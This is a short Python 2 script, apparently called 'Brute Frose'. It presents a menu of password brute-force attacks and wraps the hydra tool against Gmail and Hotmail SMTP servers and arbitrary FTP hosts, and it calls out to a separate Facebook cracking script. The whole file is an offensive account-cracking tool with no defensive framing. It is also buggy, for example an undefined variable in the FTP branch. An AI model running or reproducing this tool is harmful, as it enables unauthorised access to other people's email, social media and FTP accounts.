import os, sys, time
os.system("clear")
os.system("figlet Brute Frose")
print
print "           [01]> Gmail Brute.   "
print "           [02]> Facebook Brute "
print "           [03]> Hotmail Brute  "
print "           [04]> FTP Brute      "
print
B = raw_input("HPAS ==>> ")
if B == "1" or B == "01":
    os.system("clear")
    os.system("figlet Gmail")
    gmail = raw_input("Gmail Address : ")
    password = raw_input("Passwords : ")
    os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" %(gmail, password))
    
elif B == "2" or B == "02":
    os.system("python2 facebook")

elif B == "3" or B == "03":
    os.system("figlet Hotmail")
    hotmail = raw_input("hotmail Address : ")
    password = raw_input("Passwords : ")
    os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (hotmail, password))
  
elif B == "4" or B == "04":
      os.system("figlet FTP")
      user = raw_input("User : ")
      iphost = raw_input("IP/Hostname : ")
      word = raw_input("Wordlist : ")
      os.system("hydra -l %s -P %s %s ftp" % (user, word, iphos))